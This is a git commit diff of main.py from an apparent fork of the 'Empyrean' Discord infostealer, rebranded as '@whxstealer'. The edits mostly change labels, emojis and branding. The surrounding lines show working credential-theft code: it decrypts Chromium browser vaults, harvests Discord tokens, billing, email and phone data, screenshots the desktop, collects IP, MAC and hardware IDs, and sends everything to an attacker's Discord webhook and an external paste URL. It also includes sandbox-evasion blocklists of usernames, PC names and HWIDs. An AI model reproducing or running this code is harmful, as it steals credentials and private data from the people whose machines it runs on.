0677a680d51ae45e1697a688aee7d60af7b77616
iamarandomperson8 <112296904+iamarandomperson8@users.noreply.github.com>
2022-09-01 10:54:06 -0700

    Update main.py

--- main.py
+++ main.py
@@ -22,7 +22,7 @@ from win32crypt import CryptUnprotectData
 
 def main() -> None:
     debug()
-
+    
     webhook = "&WEBHOOK_URL&"
 
     threads = []
@@ -141,12 +141,12 @@ class discord():
                 [flag[0] for flag in self.calc_flags(r['public_flags'])[::-1]])
 
             try:
-                nitro = 'Nitro Classic' if r['premium_type'] == 1 else 'Nitro Boost'
+                nitro = 'Nitro Cl' if r['premium_type'] == 1 else 'Nitro Boost'
             except KeyError:
-                nitro = 'None'
+                nitro = 'No nitro'
 
             if b.json() == []:
-                methods = "None"
+                methods = "No"
             else:
                 methods = ""
                 try:
@@ -172,9 +172,9 @@ class discord():
                         owner = " ✅ " if guild['owner'] else "❌"
 
                         if len(i.json()) > 1:
-                            hq_guilds += f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join {guild['name']}](https://discord.com/invite/{i.json()[0]['code']})\n"
+                            hq_guilds += f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Miembros: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join {guild['name']}](https://discord.com/invite/{i.json()[0]['code']})\n"
                         else:
-                            hq_guilds += f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\nNo invite code could be found for this guild\n"
+                            hq_guilds += f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Miembros: ` ⚫ {guild['approximate_member_count']} / 🟢 {guild['approximate_presence_count']} / 🔴 {guild['approximate_member_count'] - guild['approximate_presence_count']} `\nNo invite link found\n"
 
             except TypeError or KeyError:
                 pass
@@ -198,36 +198,36 @@ class discord():
 
             embed = Embed(title=f"{username} ({userid})", color=0x000000)
             embed.set_thumbnail(url=avatar)
-            embed.add_field(name="<a:pinkcrown:996004209667346442> Token:",
-                            value=f"```{token}```\n[Click to copy!](https://paste.addi00000.repl.co/?p={token})\n\u200b", inline=False)
+            embed.add_field(name="<a:Money:966124924139876462> Token:",
+                            value=f"```{token}```\n[Copy token!](https://paste.addi00000.repl.co/?p={token})\n\u200b", inline=False)
             embed.add_field(
-                name="<a:nitroboost:996004213354139658> Nitro:", value=f"{nitro}", inline=True)
-            embed.add_field(name="<a:redboost:996004230345281546> Badges:",
+                name="<:blackemoji_138:1014947325271097475> Nitro:", value=f"{nitro}", inline=True)
+            embed.add_field(name="<:blackemoji_122:1014947330421686366> Badges:",
                             value=f"{badges if badges != '' else 'None'}", inline=True)
-            embed.add_field(name="<a:pinklv:996004222090891366> Billing:",
+            embed.add_field(name="<a:blackemoji_121:1014947328479735869> Billing:",
                             value=f"{methods if methods != '' else 'None'}", inline=True)
-            embed.add_field(name="<a:rainbowheart:996004226092245072> Email:",
+            embed.add_field(name="<:blackemoji_40:1014948449092907048> Email:",
                             value=f"{email if email != None else 'None'}", inline=True)
-            embed.add_field(name="<:starxglow:996004217699434496> Phone:",
+            embed.add_field(name="<:black_xcoringa:1014948447180292116> Phone:",
                             value=f"{phone if phone != None else 'None'}", inline=True)
 
             embed.add_field(name="\u200b", value=f"\u200b",
                             inline=False) if hq_guilds != "" else None
             if hq_guilds != "":
                 embed.add_field(
-                    name="<a:earthpink:996004236531859588> HQ Guilds:", value=f"{hq_guilds}", inline=False)
+                    name="<:spy_blackcrown:1014949650870063197> HQ Guilds:", value=f"{hq_guilds}", inline=False)
             embed.add_field(name="\u200b", value=f"\u200b",
                             inline=False) if hq_friends != "" else None
             if hq_friends != "":
                 embed.add_field(
-                    name="<a:earthpink:996004236531859588> HQ Friends:", value=f"{hq_friends}", inline=False)
+                    name="<:blackemoji_121:1014949877257609359> HQ Friends:", value=f"{hq_friends}", inline=False)
             embed.add_field(name="\u200b", value=f"\u200b",
                             inline=False) if hq_guilds or hq_friends != "" else None
 
-            embed.set_footer(text="github.com/addi00000/empyrean")
+            embed.set_footer(text="@whxstealer")
 
-            webhook.send(embed=embed, username="Empyrean",
-                         avatar_url="https://i.imgur.com/HjzfjfR.png")
+            webhook.send(embed=embed, username="@whx",
+                         avatar_url="https://media.discordapp.net/attachments/1014950946691891230/1014950966442868746/unknown.png")
 
     def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
         iv = buff[3:15]
@@ -400,7 +400,7 @@ class chromium():
             if os.path.isfile('.\\' + name + '-vault.zip'):
                 if not os.path.getsize('.\\' + name + '-vault.zip') > 8000000:
                     webhook.send(file=File('.\\' + name + '-vault.zip'),
-                                 username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")
+                                 username="@whx", avatar_url="https://media.discordapp.net/attachments/1014950946691891230/1014950966442868746/unknown.png")
                     os.remove('.\\' + name + '-vault.zip')
 
     def get_master_key(self, path: str) -> str:
@@ -527,12 +527,12 @@ class system():
         embed = Embed(title="\u200b", color=0x000000)
 
         embed.add_field(name=":bust_in_silhouette: User",
-                        value=f"```Display Name: {self.get_display_name()}\nHostname: {os.getenv('COMPUTERNAME')}\nUsername: {os.getenv('USERNAME')}```", inline=False)
-        embed.add_field(name="<:CPU:1004131852208066701> System",
+                        value=f"```Display: {self.get_display_name()}\nHostname: {os.getenv('COMPUTERNAME')}\nUsername: {os.getenv('USERNAME')}```", inline=False)
+        embed.add_field(name="<:blackq22_muerte:1014948443271209021> Sistema",
                         value=f"```CPU: {wmi.WMI().Win32_Processor()[0].Name}\nGPU: {wmi.WMI().Win32_VideoController()[0].Name}\nRAM: {round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)}\nHWID: {self.get_hwid()}```", inline=False)
-        embed.add_field(name=":floppy_disk: Disk",
+        embed.add_field(name="<:blackghost:1014948441488642110> Disco",
                         value=f"```{self.get_disk_space()}```", inline=False)
-        embed.add_field(name="<:wifi:1004131855374749807> Network",
+        embed.add_field(name="<:blackbsk666:1014947336658628758> Network",
                         value=f"```IP: {requests.get('https://api.ipify.org').text}\nMAC: {':'.join(re.findall('..', '%012x' % uuid.getnode()))}```", inline=False)
 
         ImageGrab.grab(bbox=None, include_layered_windows=False,
@@ -541,7 +541,7 @@ class system():
 
         try:
             webhook.send(embed=embed, file=File('.\\screenshot.png', filename='screenshot.png'),
-                         username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")
+                         username="@whx", avatar_url="https://media.discordapp.net/attachments/1014950946691891230/1014950966442868746/unknown.png")
         except:
             pass
 
@@ -645,7 +645,7 @@ class debug:
 
         self.blackListedUsers = ['WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A',
                                  'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']
-        self.blackListedPCNames = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O',
+        self.blackListedPCNames = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'SEXP', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O',
                                    'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']
         self.blackListedHWIDS = ['7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FF577B79-782E-0A4D-8568-B35A9B7EB76B', '08C1E400-3C56-11EA-8000-3CECEF43FEDE', '6ECEAF72-3548-476C-BD8D-73134A9182C8', '49434D53-0200-9036-2500-369025003865', '119602E8-92F9-BD4B-8979-DA682276D385', '12204D56-28C0-AB03-51B7-44A8B7525250', '63FA3342-31C7-4E8E-8089-DAFF6CE5E967', '365B4000-3B25-11EA-8000-3CECEF44010C', 'D8C30328-1B06-4611-8E3C-E433F4F9794E', '00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD04D98', '4CB82042-BA8F-1748-C941-363C391CA7F3', 'B6464A2B-92C7-4B95-A2D0-E5410081B812', 'BB233342-2E01-718F-D4A1-E7F69D026428', '9921DE3A-5C1A-DF11-9078-563412000026', 'CC5B3F62-2A04-4D2E-A46C-AA41B7050712', '00000000-0000-0000-0000-AC1F6BD04986', 'C249957A-AA08-4B21-933F-9271BEC63C85', 'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E', 'ACA69200-3C4C-11EA-8000-3CECEF4401AA', '3F284CA4-8BDF-489B-A273-41B44D668F6D',
                                  'BB64E044-87BA-C847-BC0A-C797D1A16A50', '2E6FB594-9D55-4424-8E74-CE25A25E36B0', '42A82042-3F13-512F-5E3D-6BF4FFFD8518', '38AB3342-66B0-7175-0B23-F390B3728B78', '48941AE9-D52F-11DF-BBDA-503734826431', '032E02B4-0499-05C3-0806-3C0700080009', 'DD9C3342-FB80-9A31-EB04-5794E5AE2B4C', 'E08DE9AA-C704-4261-B32D-57B2A3993518', '07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9', '88DC3342-12E6-7D62-B0AE-C80E578E7B07', '5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E', '96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE', '0934E336-72E4-4E6A-B3E5-383BD8E938C3', '12EE3342-87A2-32DE-A390-4C2DA4D512E9', '38813342-D7D0-DFC8-C56F-7FC9DFE5C972', '8DA62042-8B59-B4E3-D232-38B29A10964A', '3A9F3342-D1F2-DF37-68AE-C10F60BFB462', 'F5744000-3C78-11EA-8000-3CECEF43FEFE', 'FA8C2042-205D-13B0-FCB5-C5CC55577A35', 'C6B32042-4EC3-6FDF-C725-6F63914DA7C7', 'FCE23342-91F1-EAFC-BA97-5AAE4509E173', 'CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F', '050C3342-FADD-AEDF-EF24-C6454E1A73C9', '4DC32042-E601-F329-21C1-03F27564FD6C', 'DEAEB8CE-A573-9F48-BD40-62ED6C223F20', '05790C00-3B21-11EA-8000-3CECEF4400D0', '5EBD2E42-1DB8-78A6-0EC3-031B661D5C57', '9C6D1742-046D-BC94-ED09-C36F70CC9A91', '907A2A79-7116-4CB6-9FA5-E5A58C4587CD', 'A9C83342-4800-0578-1EE8-BA26D2A678D2', 'D7382042-00A0-A6F0-1E51-FD1BBF06CD71', '1D4D3342-D6C4-710C-98A3-9CC6571234D5', 'CE352E42-9339-8484-293A-BD50CDC639A5', '60C83342-0A97-928D-7316-5F1080A78E72', '02AD9898-FA37-11EB-AC55-1D0C0A67EA8A', 'DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F', 'FED63342-E0D6-C669-D53F-253D696D74DA', '2DD1B176-C043-49A4-830F-C623FFB88F3C', '4729AEB0-FC07-11E3-9673-CE39E79C8A00', '84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57', 'A7721742-BE24-8A1C-B859-D7F8251A83D3', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08', 'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661', '921E2042-70D3-F9F1-8CBD-B398A21F89C6']
